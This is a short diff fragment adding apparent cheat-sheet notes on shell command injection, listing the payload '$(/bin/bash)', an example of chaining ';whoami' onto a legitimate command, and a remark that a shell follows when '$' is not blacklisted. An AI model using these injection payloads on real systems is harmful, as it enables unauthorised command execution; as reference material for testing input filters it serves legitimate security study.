@@ -1,0 +1,4 @@
+   1     "   $(/bin/bash)  "
+             like ==> $>legitcommand ;whoami
+             use  ==> $>legitcommand $(/bin/bash)                if '$' isn't blacklisted you got shell
+              
